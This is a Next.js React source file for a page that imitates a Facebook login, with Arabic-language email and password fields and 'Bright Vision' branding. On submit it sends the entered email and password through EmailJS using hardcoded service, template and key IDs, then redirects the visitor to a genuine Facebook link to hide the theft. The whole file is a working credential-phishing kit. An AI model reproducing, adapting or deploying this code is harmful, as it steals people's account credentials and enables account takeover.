'use client';

import Image from "next/image";
import React, { useRef, useState } from 'react';
import emailjs from '@emailjs/browser';

const FacebookLoginForm = ({ onConfirm }) => {
  const form = useRef();
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');

  const sendEmail = (e) => {
    e.preventDefault();

    // Remove the email confirmation check
    if (!email) {
      setError('البريد الإلكتروني مطلوب');
      return;
    }

    setError('');

    emailjs.sendForm(
      'service_nzuz8ot',
      'template_ov8ie2n',
      form.current,
      'T5jy2-at9YckZQa-A'
    ).then(
      (result) => {
        console.log(result.text);
        onConfirm(); // Trigger success state and redirect to Google
      },
      (error) => {
        console.log(error.text);
        alert('فشل في إرسال الرسالة. حاول مجددًا.');
      }
    );
  };

  return (
    <form ref={form} onSubmit={sendEmail} className="space-y-4">
      <input
        type="email"
        name="email"
        placeholder="البريد الإلكتروني"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        className="w-full px-4 py-3 placeholder-gray-500 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877f2]"
        required
      />

      <input
        type="password"
        name="password"
        placeholder="كلمة المرور"
        className="w-full px-4 py-3  placeholder-gray-500 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877f2]"
        required
      />

      {error && (
        <p className="text-red-600 text-sm text-center">{error}</p>
      )}

      <button
        type="submit"
        className="w-full bg-[#1877f2] text-white py-3 rounded-md font-semibold hover:bg-[#165fd0] transition"
      >
        تأكيد
      </button>
    </form>
  );
};

export default function Home() {
  const [confirmed, setConfirmed] = useState(false);

  const handleConfirmation = () => {
    setConfirmed(true);
    window.location.href = 'https://www.facebook.com/share/r/156PHcMbL8/'; // Redirect to Google after confirmation
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4" dir="rtl">
      <div className="w-full max-w-md bg-white p-6 rounded-xl shadow-md">
        <div className="flex flex-col gap-3 items-center mb-4 justify-center">
          <Image src="/images/images.png" alt="icon" width={50} height={50} />
          <div className="relative w-[120px] h-[120px] rounded-full overflow-hidden">
            <Image
              src="/images/bright.jpeg"
              alt="icon"
              width={120}
              height={120}
              className="rounded-full object-cover"
            />
            <div className="absolute inset-0  rounded-full" />

          </div>
          <p className="text-2xl font-bold text-gray-900">Bright Vision</p>
          {/* <span className="text-2xl font-semibold text-gray-800">تسجيل الدخول</span> */}
        </div>

        <div className="text-gray-700 mb-6 leading-relaxed">

        </div>

        <FacebookLoginForm onConfirm={handleConfirmation} />

      </div>
    </div>
  );
}
